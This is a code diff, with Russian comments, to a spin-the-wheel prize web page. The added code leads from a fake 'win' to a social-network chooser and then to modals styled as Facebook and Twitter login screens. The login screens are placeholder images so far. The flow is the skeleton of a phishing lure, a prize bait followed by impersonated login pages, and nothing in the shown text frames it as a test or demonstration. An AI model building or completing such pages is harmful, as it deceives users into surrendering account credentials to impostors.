@@ -172,7 +172,7 @@
             left: 100%;
         }
 
-        /* Ð¡ÑÐ¸Ð»Ð¸ Ð´Ð»Ñ Ð¼Ð¾Ð´Ð°Ð»ÑÐ½Ð¾Ð³Ð¾ Ð¾ÐºÐ½Ð° */
+        /* Стили для модальных окон */
         .modal-overlay {
             display: none;
             position: fixed;
@@ -180,7 +180,7 @@
             left: 0;
             width: 100%;
             height: 100%;
-            background-color: rgba(0, 0, 0, 0.8);
+            background-color: rgba(0, 0, 0, 0.9);
             z-index: 1000;
             justify-content: center;
             align-items: center;
@@ -190,6 +190,7 @@
             position: relative;
             max-width: 90%;
             max-height: 90%;
+            text-align: center;
         }
 
         .modal-image {
@@ -198,6 +199,53 @@
             border-radius: 10px;
             box-shadow: 0 0 30px rgba(255, 215, 0, 0.5);
             cursor: pointer;
+            max-width: 400px;
+        }
+
+        .login-options {
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+            margin-top: 20px;
+        }
+
+        .login-option {
+            cursor: pointer;
+            transition: transform 0.3s;
+        }
+
+        .login-option:hover {
+            transform: scale(1.05);
+        }
+
+        .close-button {
+            position: absolute;
+            top: -15px;
+            right: -15px;
+            background: red;
+            color: white;
+            border: none;
+            border-radius: 50%;
+            width: 30px;
+            height: 30px;
+            font-size: 20px;
+            cursor: pointer;
+            z-index: 1001;
+        }
+
+        .back-button {
+            position: absolute;
+            top: -15px;
+            left: -15px;
+            background: #333;
+            color: white;
+            border: none;
+            border-radius: 50%;
+            width: 30px;
+            height: 30px;
+            font-size: 20px;
+            cursor: pointer;
+            z-index: 1001;
         }
 
         @keyframes wheelGlow {
@@ -226,6 +274,10 @@
                 font-size: 1.3rem;
                 margin: 20px auto;
             }
+            
+            .modal-image {
+                max-width: 350px;
+            }
         }
 
         @media (max-width: 480px) {
@@ -249,6 +301,10 @@
                 font-size: 1.2rem;
                 margin: 15px auto;
             }
+            
+            .modal-image {
+                max-width: 300px;
+            }
         }
     </style>
 </head>
@@ -262,18 +318,56 @@
     <div class="container">
         <div class="roulette-container">
             <div class="wheel-container">
-                <img src="wheel.png" alt="ÐÐ¾Ð»ÐµÑÐ¾ ÑÑÐ»ÐµÑÐºÐ¸" class="wheel prize-wheel" id="prizeWheel">
-                <img src="wheel_base.png" alt="ÐÑÐ½Ð¾Ð²Ð°Ð½Ð¸Ðµ ÐºÐ¾Ð»ÐµÑÐ°" class="wheel wheel-base" id="wheelBase">
+                <img src="wheel.png" alt="Колесо рулетки" class="wheel prize-wheel" id="prizeWheel">
+                <img src="wheel_base.png" alt="Основание колеса" class="wheel wheel-base" id="wheelBase">
             </div>
         </div>
 
-        <button class="spin-button" id="spinButton">ÐÐ Ð£Ð¢ÐÐ¢Ð¬ Ð Ð£ÐÐÐ¢ÐÐ£</button>
+        <button class="spin-button" id="spinButton">КРУТИТЬ РУЛЕТКУ</button>
     </div>
 
-    <!-- ÐÐ¾Ð´Ð°Ð»ÑÐ½Ð¾Ðµ Ð¾ÐºÐ½Ð¾ Ñ ÐºÐ°ÑÑÐ¸Ð½ÐºÐ¾Ð¹ Ð²ÑÐ¸Ð³ÑÑÑÐ° -->
+    <!-- 1. Модальное окно с картинкой выигрыша -->
     <div class="modal-overlay" id="winModal">
         <div class="modal-content">
+            <button class="close-button" onclick="hideModal('winModal')">×</button>
             <img src="prize.png" alt="Congratulations" class="modal-image" id="prizeImage">
+        </div>
+    </div>
+
+    <!-- 2. Модальное окно выбора соцсети (добавляем ПОСЛЕ выигрыша) -->
+    <div class="modal-overlay" id="socialModal">
+        <div class="modal-content">
+            <button class="close-button" onclick="hideModal('socialModal')">×</button>
+            <!-- Заглушка для картинки выбора соцсетей -->
+            <img src="social_choice.png" alt="Choose Social Network" class="modal-image" id="socialChoiceImage">
+            
+            <div class="login-options">
+                <!-- Кнопка Facebook -->
+                <img src="facebook_button.png" alt="Login with Facebook" class="login-option" onclick="showFacebookLogin()">
+                
+                <!-- Кнопка Twitter -->
+                <img src="twitter_button.png" alt="Login with Twitter" class="login-option" onclick="showTwitterLogin()">
+            </div>
+        </div>
+    </div>
+
+    <!-- 3. Модальное окно входа в Facebook -->
+    <div class="modal-overlay" id="facebookModal">
+        <div class="modal-content">
+            <button class="back-button" onclick="showSocialModal()">←</button>
+            <button class="close-button" onclick="hideModal('facebookModal')">×</button>
+            <!-- Заглушка для страницы входа в Facebook -->
+            <img src="facebook_login.png" alt="Facebook Login" class="modal-image" id="facebookLoginImage">
+        </div>
+    </div>
+
+    <!-- 4. Модальное окно входа в Twitter -->
+    <div class="modal-overlay" id="twitterModal">
+        <div class="modal-content">
+            <button class="back-button" onclick="showSocialModal()">←</button>
+            <button class="close-button" onclick="hideModal('twitterModal')">×</button>
+            <!-- Заглушка для страницы входа в Twitter -->
+            <img src="twitter_login.png" alt="Twitter Login" class="modal-image" id="twitterLoginImage">
         </div>
     </div>
 
@@ -281,7 +375,9 @@
         const spinButton = document.getElementById('spinButton');
         const prizeWheel = document.getElementById('prizeWheel');
         const winModal = document.getElementById('winModal');
-        const prizeImage = document.getElementById('prizeImage');
+        const socialModal = document.getElementById('socialModal');
+        const facebookModal = document.getElementById('facebookModal');
+        const twitterModal = document.getElementById('twitterModal');
 
         let isSpinning = false;
         let currentRotation = 0;
@@ -300,7 +396,7 @@
             currentRotation += totalRotation;
             prizeWheel.style.transform = `rotate(${currentRotation}deg)`;
             
-            // ÐÐ¾ÑÐ»Ðµ Ð·Ð°Ð²ÐµÑÑÐµÐ½Ð¸Ñ Ð²ÑÐ°ÑÐµÐ½Ð¸Ñ Ð¿Ð¾ÐºÐ°Ð·ÑÐ²Ð°ÐµÐ¼ Ð¼Ð¾Ð´Ð°Ð»ÑÐ½Ð¾Ðµ Ð¾ÐºÐ½Ð¾
+            // После завершения вращения показываем модальное окно с выигрышем
             setTimeout(() => {
                 isSpinning = false;
                 spinButton.disabled = false;
@@ -308,47 +404,83 @@
             }, 4000);
         }
 
+        // Функции для показа модальных окон
         function showWinModal() {
-            winModal.style.display = 'flex';
-            // ÐÐ»Ð¾ÐºÐ¸ÑÑÐµÐ¼ ÑÐºÑÐ¾Ð»Ð» Ð¿ÑÐ¸ Ð¾ÑÐºÑÑÑÐ¾Ð¼ Ð¼Ð¾Ð´Ð°Ð»ÑÐ½Ð¾Ð¼ Ð¾ÐºÐ½Ðµ
-            document.body.style.overflow = 'hidden';
+            showModal('winModal');
+            // Через 3 секунды показываем окно выбора соцсети
+            setTimeout(() => {
+                hideModal('winModal');
+                setTimeout(() => {
+                    showSocialModal();
+                }, 500);
+            }, 3000);
         }
 
-        function hideWinModal() {
-            winModal.style.display = 'none';
-            // ÐÐ¾ÑÑÑÐ°Ð½Ð°Ð²Ð»Ð¸Ð²Ð°ÐµÐ¼ ÑÐºÑÐ¾Ð»Ð»
-            document.body.style.overflow = 'auto';
+        function showSocialModal() {
+            showModal('socialModal');
         }
 
-        // ÐÐ°ÐºÑÑÑÐ¸Ðµ Ð¼Ð¾Ð´Ð°Ð»ÑÐ½Ð¾Ð³Ð¾ Ð¾ÐºÐ½Ð° Ð¿ÑÐ¸ ÐºÐ»Ð¸ÐºÐµ Ð½Ð° ÐºÐ°ÑÑÐ¸Ð½ÐºÑ
-        prizeImage.addEventListener('click', function() {
-            hideWinModal();
-        });
+        function showFacebookLogin() {
+            hideModal('socialModal');
+            setTimeout(() => {
+                showModal('facebookModal');
+            }, 300);
+        }
 
-        // ÐÐ°ÐºÑÑÑÐ¸Ðµ Ð¼Ð¾Ð´Ð°Ð»ÑÐ½Ð¾Ð³Ð¾ Ð¾ÐºÐ½Ð° Ð¿ÑÐ¸ ÐºÐ»Ð¸ÐºÐµ Ð²Ð½Ðµ ÐºÐ°ÑÑÐ¸Ð½ÐºÐ¸
-        winModal.addEventListener('click', function(e) {
-            if (e.target === winModal) {
-                hideWinModal();
+        function showTwitterLogin() {
+            hideModal('socialModal');
+            setTimeout(() => {
+                showModal('twitterModal');
+            }, 300);
+        }
+
+        // Общие функции для управления модальными окнами
+        function showModal(modalId) {
+            const modal = document.getElementById(modalId);
+            if (modal) {
+                modal.style.display = 'flex';
+                document.body.style.overflow = 'hidden';
             }
+        }
+
+        function hideModal(modalId) {
+            const modal = document.getElementById(modalId);
+            if (modal) {
+                modal.style.display = 'none';
+                // Если все модальные окна закрыты, восстанавливаем скролл
+                if (!document.querySelector('.modal-overlay[style*="display: flex"]')) {
+                    document.body.style.overflow = 'auto';
+                }
+            }
+        }
+
+        // Закрытие модальных окон при клике вне контента
+        document.querySelectorAll('.modal-overlay').forEach(modal => {
+            modal.addEventListener('click', function(e) {
+                if (e.target === modal) {
+                    hideModal(modal.id);
+                }
+            });
         });
 
+        // Инициализация
         spinButton.addEventListener('click', spinRoulette);
 
-        // ÐÐ»Ð¾ÐºÐ¸ÑÑÐµÐ¼ ÑÐºÑÐ¾Ð»Ð» Ð½Ð° Ð²ÑÐµÐ¹ ÑÑÑÐ°Ð½Ð¸ÑÐµ Ð¿ÑÐ¸ ÐºÐ°ÑÐ°Ð½Ð¸Ð¸ ÑÑÐ»ÐµÑÐºÐ¸
+        // Блокируем скролл на всей странице при касании рулетки
         document.addEventListener('touchmove', function(e) {
             if (e.target.closest('.roulette-container') || e.target.closest('.container')) {
                 e.preventDefault();
             }
         }, { passive: false });
 
-        // ÐÐ»Ð¾ÐºÐ¸ÑÑÐµÐ¼ ÐºÐ¾Ð»ÐµÑÐ¸ÐºÐ¾ Ð¼ÑÑÐ¸ Ð½Ð° ÑÑÐ»ÐµÑÐºÐµ
+        // Блокируем колесико мыши на рулетке
         document.addEventListener('wheel', function(e) {
             if (e.target.closest('.roulette-container') || e.target.closest('.container')) {
                 e.preventDefault();
             }
         }, { passive: false });
 
-        // ÐÐµÐ»Ð°ÐµÐ¼ ÑÑÐ»ÐµÑÐºÑ ÑÑÐ°ÑÐ¸ÑÐ½Ð¾Ð¹ Ð¿ÑÐ¸ ÑÐºÑÐ¾Ð»Ð»Ðµ
+        // Делаем рулетку статичной при скролле
         window.addEventListener('scroll', function() {
             document.querySelector('.container').style.transform = 'translateY(0)';
         });
